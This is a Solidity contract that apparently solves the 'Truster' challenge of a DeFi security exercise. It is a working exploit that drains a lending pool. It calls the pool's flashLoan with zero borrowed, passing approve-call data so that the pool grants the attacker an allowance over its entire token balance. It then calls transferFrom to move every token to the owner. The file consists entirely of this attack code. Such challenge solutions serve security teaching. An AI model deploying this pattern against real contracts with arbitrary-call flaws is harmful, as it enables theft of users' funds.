// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; 

interface ILenderPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrusterAttacker {
    address private immutable owner;
    constructor() {
        owner = msg.sender;
    }
    function attack(ILenderPool pool, IERC20 token) external {
        require(msg.sender == owner, "Must be owner");
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            owner,
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance)
        );
        token.transferFrom(address(pool), owner, poolBalance);
    }
}